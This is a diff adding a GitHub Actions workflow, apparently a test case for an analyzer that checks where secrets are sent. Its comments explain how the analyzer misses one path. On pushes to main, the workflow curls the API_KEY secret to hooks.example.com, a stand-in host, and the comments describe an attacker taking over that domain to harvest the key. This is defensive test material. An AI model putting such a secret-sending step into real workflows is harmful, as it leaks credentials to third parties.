@@ -1,0 +1,25 @@
+# situation: on push, a step sets A to hooks and B to example.com when the
+#   ref is refs/heads/main, and A to api and B to github.com otherwise, and
+#   sends the secret API_KEY to "https://$A.$B/x" with curl.
+# reason: a todo (the same file): on a push to main, the URL names
+#   hooks.example.com when curl runs, so the request carries the secret to
+#   hooks.example.com.
+# cause: two variables of the word each have more than one assignment that
+#   reaches the request; the rule does not combine them, since a run may
+#   set them together, and reads each from its assignment that comes last
+#   in the script: api.github.com, a host of GitHub.
+# attack: the attacker takes over the server of hooks.example.com, by a
+#   breach of the vendor or by registering the domain when the domain
+#   lapses.
+# attack-run-behavior: on a push to main, curl sends the secret to
+#   hooks.example.com, whose server, now the attacker's, logs the secret.
+on: push
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          API_KEY: ${{ secrets.API_KEY }}
+        run: |
+          if [ "$GITHUB_REF" = refs/heads/main ]; then A=hooks; B=example.com; else A=api; B=github.com; fi
+          curl -fsS -H "x-apikey: $API_KEY" "https://$A.$B/x"
